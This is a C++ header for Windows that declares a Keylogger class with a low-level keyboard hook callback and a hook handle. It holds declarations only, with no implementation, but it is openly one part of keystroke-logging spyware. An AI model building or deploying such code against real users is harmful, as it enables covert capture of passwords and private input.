#ifndef LOGGER_H
#define LOGGER_H

#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

class Keylogger {
public:
	Keylogger();
	~Keylogger();
	static LRESULT __stdcall KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

private:
	HHOOK _hKey;
	MSG _msg;
	HINSTANCE _hExe;
};

#endif // !LOGGER_H